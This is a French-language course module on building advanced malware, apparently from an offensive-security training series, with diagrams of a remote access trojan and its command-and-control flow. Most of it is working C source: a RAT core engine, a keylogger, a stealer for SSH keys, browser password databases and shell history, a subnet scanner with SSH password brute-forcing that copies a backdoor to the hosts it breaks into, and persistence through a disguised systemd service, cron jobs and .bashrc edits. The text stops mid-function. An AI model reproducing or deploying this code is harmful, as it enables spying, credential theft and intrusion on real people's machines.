# Module 55 : DÃ©veloppement de Malware AvancÃ©

## ğŸ¯ Ce que tu vas apprendre

Dans ce module, tu vas maÃ®triser :
- Architecture complÃ¨te d'un malware moderne
- DÃ©velopper un RAT (Remote Access Trojan) complet
- ImplÃ©menter des modules de C2 avancÃ©s
- Techniques de persistence multi-plateforme
- Lateral movement et pivoting
- Exfiltration de donnÃ©es furtive
- Projet complet: Full-featured backdoor

## ğŸ“š ThÃ©orie

### Architecture d'un malware moderne

Un **malware professionnel** est modulaire et suit une architecture en couches :

1. **Dropper/Loader** : Point d'entrÃ©e initial
2. **Payload principal** : Core du malware
3. **Modules** : FonctionnalitÃ©s additionnelles
4. **C2 Communication** : Communication avec l'attaquant
5. **Persistence** : Survie aux redÃ©marrages
6. **Ã‰vasion** : Contournement des dÃ©fenses

### Cycle de vie d'un malware

1. **Delivery** : Arriver sur la cible (phishing, exploit, etc.)
2. **Execution** : S'exÃ©cuter sur le systÃ¨me
3. **Persistence** : S'installer durablement
4. **Defense Evasion** : Ã‰viter la dÃ©tection
5. **Credential Access** : Voler des identifiants
6. **Discovery** : Reconnaissance du rÃ©seau
7. **Lateral Movement** : Se propager
8. **Collection** : Collecter des donnÃ©es
9. **Exfiltration** : Exfiltrer les donnÃ©es
10. **Impact** : Objectif final (ransomware, sabotage, etc.)

## ğŸ” Visualisation

### Architecture modulaire d'un RAT

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          RAT (Remote Access Trojan)                 â”‚
â”‚               ARCHITECTURE                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚         DROPPER                    â”‚            â”‚
â”‚  â”‚  - Unpacking                       â”‚            â”‚
â”‚  â”‚  - Anti-sandbox checks             â”‚            â”‚
â”‚  â”‚  - UAC bypass                      â”‚            â”‚
â”‚  â”‚  - Deploy main payload             â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                 â”‚                                   â”‚
â”‚                 â–¼                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚      CORE ENGINE                   â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚            â”‚
â”‚  â”‚  â”‚ Module Loader                â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Load/unload modules        â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Dynamic loading            â”‚  â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚            â”‚
â”‚  â”‚  â”‚ C2 Communication             â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Heartbeat                  â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Command reception          â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Result transmission        â”‚  â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚            â”‚
â”‚  â”‚  â”‚ Config Manager               â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - C2 servers                 â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Encryption keys            â”‚  â”‚            â”‚
â”‚  â”‚  â”‚ - Module settings            â”‚  â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                   â”‚                                 â”‚
â”‚                   â–¼                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚         MODULES                    â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚            â”‚
â”‚  â”‚  â”‚ Keylogger                  â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Capture keystrokes       â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Screenshot on keywords   â”‚    â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚            â”‚
â”‚  â”‚  â”‚ Credential Stealer         â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Browser passwords        â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - SSH keys                 â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Tokens                   â”‚    â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚            â”‚
â”‚  â”‚  â”‚ File Manager               â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Upload/download          â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Delete/modify            â”‚    â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚            â”‚
â”‚  â”‚  â”‚ Shell                      â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Remote command exec      â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Reverse shell            â”‚    â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚            â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚            â”‚
â”‚  â”‚  â”‚ Lateral Movement           â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - Network scanning         â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - SMB exploitation         â”‚    â”‚            â”‚
â”‚  â”‚  â”‚ - SSH bruteforce           â”‚    â”‚            â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚     PERSISTENCE LAYER              â”‚            â”‚
â”‚  â”‚  - Systemd service (Linux)         â”‚            â”‚
â”‚  â”‚  - Cron job                        â”‚            â”‚
â”‚  â”‚  - .bashrc injection               â”‚            â”‚
â”‚  â”‚  - Autostart (Registry/Startup)    â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚     EVASION LAYER                  â”‚            â”‚
â”‚  â”‚  - Anti-sandbox                    â”‚            â”‚
â”‚  â”‚  - Anti-debug                      â”‚            â”‚
â”‚  â”‚  - Encrypted strings               â”‚            â”‚
â”‚  â”‚  - Code obfuscation                â”‚            â”‚
â”‚  â”‚  - Process injection               â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Communication C2 chiffrÃ©e

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          C2 COMMUNICATION FLOW                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  Bot (Victime)              C2 Server (Attaquant)   â”‚
â”‚                                                     â”‚
â”‚  1. Initial Beacon                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                â”‚
â”‚  â”‚ Generate AES keyâ”‚                                â”‚
â”‚  â”‚ Encrypt with    â”‚                                â”‚
â”‚  â”‚ RSA public key  â”‚                                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚
â”‚          â”‚                                          â”‚
â”‚          â”‚ [RSA(AES_KEY) + BOT_INFO]                â”‚
â”‚          â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º        â”‚
â”‚                                    â”‚                â”‚
â”‚                             â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚                             â”‚ Decrypt AES keyâ”‚      â”‚
â”‚                             â”‚ Store session  â”‚      â”‚
â”‚                             â”‚ Send ACK       â”‚      â”‚
â”‚                             â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚          â”‚                        â”‚                â”‚
â”‚          â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                â”‚
â”‚          â”‚      [ACK_ENCRYPTED]                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”                                â”‚
â”‚  â”‚ Session active â”‚                                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚
â”‚                                                     â”‚
â”‚  2. Command Loop                                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                â”‚
â”‚  â”‚ Sleep (jitter) â”‚                                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚
â”‚          â”‚                                          â”‚
â”‚          â”‚ [HEARTBEAT_AES_ENCRYPTED]                â”‚
â”‚          â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º        â”‚
â”‚                                    â”‚                â”‚
â”‚                             â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚                             â”‚ Check commands â”‚      â”‚
â”‚                             â”‚ in queue       â”‚      â”‚
â”‚                             â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚          â”‚                        â”‚                â”‚
â”‚          â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                â”‚
â”‚          â”‚   [COMMAND_AES_ENCRYPTED]               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”                                â”‚
â”‚  â”‚ Decrypt commandâ”‚                                â”‚
â”‚  â”‚ Execute        â”‚                                â”‚
â”‚  â”‚ Encrypt result â”‚                                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚
â”‚          â”‚                                          â”‚
â”‚          â”‚ [RESULT_AES_ENCRYPTED]                   â”‚
â”‚          â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º        â”‚
â”‚                                    â”‚                â”‚
â”‚                             â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚                             â”‚ Decrypt result â”‚      â”‚
â”‚                             â”‚ Display to     â”‚      â”‚
â”‚                             â”‚ operator       â”‚      â”‚
â”‚                             â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                     â”‚
â”‚  Features:                                          â”‚
â”‚  - AES-256 encryption                               â”‚
â”‚  - RSA for key exchange                             â”‚
â”‚  - Jitter (random sleep)                            â”‚
â”‚  - Domain fronting (optionnel)                      â”‚
â”‚  - HTTPS (looks legitimate)                         â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ğŸ’» Exemple pratique

### Exemple 1 : Core Engine d'un RAT

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#define C2_SERVER "192.168.1.100"
#define C2_PORT 4444
#define BEACON_INTERVAL 60
#define MAX_MODULES 10

// Structure de module
typedef struct {
    char *name;
    void (*init)();
    void (*execute)(char *args);
    void (*cleanup)();
} Module;

// Modules registry
Module *modules[MAX_MODULES];
int module_count = 0;

// Register un module
void register_module(const char *name,
                     void (*init)(),
                     void (*execute)(char*),
                     void (*cleanup)()) {
    if (module_count >= MAX_MODULES) {
        return;
    }

    Module *mod = malloc(sizeof(Module));
    mod->name = strdup(name);
    mod->init = init;
    mod->execute = execute;
    mod->cleanup = cleanup;

    modules[module_count++] = mod;

    printf("[+] Module registered: %s\n", name);
}

// ExÃ©cuter un module
void execute_module(const char *name, char *args) {
    for (int i = 0; i < module_count; i++) {
        if (strcmp(modules[i]->name, name) == 0) {
            printf("[*] Executing module: %s\n", name);
            modules[i]->execute(args);
            return;
        }
    }

    printf("[-] Module not found: %s\n", name);
}

// Thread C2
void* c2_thread(void *arg) {
    printf("[*] C2 thread started\n");

    while (1) {
        printf("[*] Sending beacon to C2...\n");

        // Connexion au C2 (simplifiÃ©)
        // send_beacon_to_c2();

        // Recevoir commandes
        // char *command = receive_command();

        // Exemple de commande
        char command[] = "shell:whoami";

        // Parser et exÃ©cuter
        char *module = strtok(command, ":");
        char *args = strtok(NULL, ":");

        execute_module(module, args);

        // Sleep avec jitter
        int jitter = (rand() % 30) - 15;
        sleep(BEACON_INTERVAL + jitter);
    }

    return NULL;
}

int main() {
    printf("=== RAT Core Engine ===\n\n");

    // Initialiser modules (sera fait dans les exemples suivants)

    // Lancer le thread C2
    pthread_t c2_tid;
    pthread_create(&c2_tid, NULL, c2_thread, NULL);

    // Main thread continue...
    pthread_join(c2_tid, NULL);

    return 0;
}
```

### Exemple 2 : Module Keylogger

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

#define LOGFILE "/tmp/.keylog"

// Mapping des keycodes (simplifiÃ©)
const char *keymap[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "<BS>", "<TAB>", "q", "w", "e", "r", "t", "y", "u",
    "i", "o", "p", "[", "]", "<ENTER>", "<CTRL>", "a", "s", "d",
    "f", "g", "h", "j", "k", "l", ";", "'", "`", "<SHIFT>", "\\",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<SHIFT>",
    "*", "<ALT>", " ", "<CAPS>"
};

void keylogger_init() {
    printf("[+] Keylogger module initialized\n");

    // CrÃ©er le fichier de log (cachÃ©)
    FILE *fp = fopen(LOGFILE, "a");
    if (fp) {
        fprintf(fp, "\n=== Keylogger Started ===\n");
        fclose(fp);
    }
}

void keylogger_execute(char *args) {
    printf("[*] Starting keylogger...\n");

    // Ouvrir le device input (nÃ©cessite root gÃ©nÃ©ralement)
    const char *device = "/dev/input/event0"; // Ã€ adapter

    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open keyboard device");
        return;
    }

    struct input_event ev;
    FILE *logfp = fopen(LOGFILE, "a");

    if (!logfp) {
        close(fd);
        return;
    }

    printf("[+] Logging keystrokes to %s\n", LOGFILE);

    while (1) {
        read(fd, &ev, sizeof(ev));

        // Capturer seulement les key press (type 1, value 1)
        if (ev.type == EV_KEY && ev.value == 1) {
            if (ev.code < sizeof(keymap) / sizeof(keymap[0])) {
                fprintf(logfp, "%s", keymap[ev.code]);
                fflush(logfp);
            }
        }
    }

    fclose(logfp);
    close(fd);
}

void keylogger_cleanup() {
    printf("[+] Keylogger module cleanup\n");
}

// Pour l'intÃ©grer au core:
// register_module("keylogger", keylogger_init, keylogger_execute, keylogger_cleanup);
```

### Exemple 3 : Module Credential Stealer

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define CRED_OUTPUT "/tmp/.credentials.txt"

void steal_ssh_keys() {
    printf("[*] Stealing SSH keys...\n");

    struct passwd *pw = getpwuid(getuid());
    char ssh_dir[512];

    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", pw->pw_dir);

    // Copier id_rsa
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "cat %s/id_rsa >> %s 2>/dev/null",
             ssh_dir, CRED_OUTPUT);

    system(cmd);

    printf("[+] SSH keys copied\n");
}

void steal_browser_passwords() {
    printf("[*] Stealing browser passwords...\n");

    // Chrome passwords (Linux)
    struct passwd *pw = getpwuid(getuid());
    char chrome_db[512];

    snprintf(chrome_db, sizeof(chrome_db),
             "%s/.config/google-chrome/Default/Login Data",
             pw->pw_dir);

    // Copier la base de donnÃ©es
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "echo '\n=== Chrome Passwords ===' >> %s && "
             "cp '%s' /tmp/.chrome_db 2>/dev/null",
             CRED_OUTPUT, chrome_db);

    system(cmd);

    printf("[+] Browser passwords copied\n");
}

void steal_bash_history() {
    printf("[*] Stealing bash history...\n");

    struct passwd *pw = getpwuid(getuid());
    char history[512];

    snprintf(history, sizeof(history), "%s/.bash_history", pw->pw_dir);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "echo '\n=== Bash History ===' >> %s && "
             "cat '%s' >> %s 2>/dev/null",
             CRED_OUTPUT, history, CRED_OUTPUT);

    system(cmd);

    printf("[+] Bash history copied\n");
}

void credsstealer_init() {
    printf("[+] Credential Stealer module initialized\n");

    FILE *fp = fopen(CRED_OUTPUT, "w");
    if (fp) {
        fprintf(fp, "=== Credentials Stolen ===\n");
        fclose(fp);
    }
}

void credsstealer_execute(char *args) {
    printf("[*] Stealing credentials...\n");

    steal_ssh_keys();
    steal_browser_passwords();
    steal_bash_history();

    printf("[+] Credentials saved to %s\n", CRED_OUTPUT);
    printf("[+] Ready for exfiltration\n");
}

void credsstealer_cleanup() {
    // Optionnel: supprimer les traces
    // unlink(CRED_OUTPUT);
}
```

### Exemple 4 : Module Lateral Movement

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define SCAN_TIMEOUT 1

// Scanner un port sur une IP
int scan_port(const char *ip, int port) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 0;
    }

    // Timeout
    struct timeval tv;
    tv.tv_sec = SCAN_TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);

    int result = connect(sock, (struct sockaddr*)&server, sizeof(server));

    close(sock);

    return (result == 0);
}

// Scanner un subnet
void scan_network(const char *subnet) {
    printf("[*] Scanning network: %s.0/24\n", subnet);

    int ports[] = {22, 80, 443, 445, 3389, 5900};
    int port_count = sizeof(ports) / sizeof(ports[0]);

    FILE *fp = fopen("/tmp/.scan_results.txt", "w");

    for (int i = 1; i < 255; i++) {
        char ip[32];
        snprintf(ip, sizeof(ip), "%s.%d", subnet, i);

        for (int j = 0; j < port_count; j++) {
            if (scan_port(ip, ports[j])) {
                printf("[+] %s:%d OPEN\n", ip, ports[j]);

                if (fp) {
                    fprintf(fp, "%s:%d\n", ip, ports[j]);
                }
            }
        }
    }

    if (fp) {
        fclose(fp);
    }

    printf("[+] Scan complete. Results in /tmp/.scan_results.txt\n");
}

// Exploitation SSH (bruteforce simplifiÃ©)
void exploit_ssh(const char *target) {
    printf("[*] Attempting SSH exploitation on %s\n", target);

    // Liste de mots de passe communs
    const char *passwords[] = {
        "admin", "password", "123456", "root", "toor", NULL
    };

    for (int i = 0; passwords[i] != NULL; i++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "sshpass -p '%s' ssh -o StrictHostKeyChecking=no "
                 "root@%s 'whoami' 2>/dev/null",
                 passwords[i], target);

        int ret = system(cmd);

        if (ret == 0) {
            printf("[+] SSH access gained with password: %s\n", passwords[i]);

            // DÃ©ployer le backdoor
            snprintf(cmd, sizeof(cmd),
                     "sshpass -p '%s' scp /tmp/backdoor root@%s:/tmp/ && "
                     "sshpass -p '%s' ssh root@%s '/tmp/backdoor &'",
                     passwords[i], target,
                     passwords[i], target);

            system(cmd);

            printf("[+] Backdoor deployed on %s\n", target);
            return;
        }
    }

    printf("[-] SSH exploitation failed on %s\n", target);
}

void lateral_init() {
    printf("[+] Lateral Movement module initialized\n");
}

void lateral_execute(char *args) {
    // args format: "scan:192.168.1" ou "exploit:192.168.1.50"

    char *action = strtok(args, ":");
    char *param = strtok(NULL, ":");

    if (strcmp(action, "scan") == 0) {
        scan_network(param);
    } else if (strcmp(action, "exploit") == 0) {
        exploit_ssh(param);
    }
}

void lateral_cleanup() {
    printf("[+] Lateral Movement cleanup\n");
}
```

### Exemple 5 : Module de Persistence

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

void install_systemd_service() {
    printf("[*] Installing systemd service...\n");

    const char *service_content =
        "[Unit]\n"
        "Description=System Update Checker\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=/usr/local/bin/.sysupdate\n"
        "Restart=always\n"
        "RestartSec=30\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    // Ã‰crire le service
    FILE *fp = fopen("/tmp/sysupdate.service", "w");
    if (fp) {
        fprintf(fp, "%s", service_content);
        fclose(fp);

        // Installer
        system("sudo cp /tmp/sysupdate.service /etc/systemd/system/");
        system("sudo systemctl daemon-reload");
        system("sudo systemctl enable sysupdate.service");
        system("sudo systemctl start sysupdate.service");

        printf("[+] Systemd service installed\n");
    }
}

void install_cron_job() {
    printf("[*] Installing cron job...\n");

    // Ajouter au crontab
    system("(crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/.sysupdate') | crontab -");
    system("(crontab -l 2>/dev/null; echo '*/30 * * * * /usr/local/bin/.sysupdate') | crontab -");

    printf("[+] Cron job installed (reboot + every 30 min)\n");
}

void install_bashrc() {
    printf("[*] Modifying .bashrc...\n");

    char bashrc_path[512];
    struct passwd *pw = getpwuid(getuid());
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", pw->pw_dir);

    FILE *fp = fopen(bashrc_path, "a");
    if (fp) {
        fprintf(fp, "\n# System update check\n");
        fprintf(fp, "/usr/local/bin/.sysupdate &>/dev/null &\n");
        fclose(fp);

        printf("[+] .bashrc modified\n");
    }
}

void copy_backdoor() {
    printf("[*] Copying backdoor to persistent location...\n");

    // Copier le binaire actuel
    char exe_path[512];
    readlink("/proc/self/exe", exe_path, sizeof(exe_path));

    system("sudo cp /proc/self/exe /usr/local/bin/.sysupdate");
    system("sudo chmod +x /usr/local/bin/.sysupdate");

    printf("[+] Backdoor copied to /usr/local/bin/.sysupdate\n");
}

void persistence_init() {
    printf("[+] Persistence module initialized\n");
}

void persistence_execute(char *args) {
    printf("[*] Installing persistence mechanisms...\n");

    copy_backdoor();

    // Tenter plusieurs mÃ©thodes
    if (geteuid() == 0) {
        printf("[+] Running as root, using systemd\n");
        install_systemd_service();
    } else {
        printf("[*] Running as user, using cron + bashrc\n");
    }

    install_cron_job();
    install_bashrc();

    printf("[+] Persistence installed successfully\n");
}

void persistence_cleanup() {
    printf("[+] Persistence cleanup (removal)\n");

    // Supprimer les mÃ©canismes de persistence
    system("sudo systemctl stop sysupdate.service 2>/dev/null");
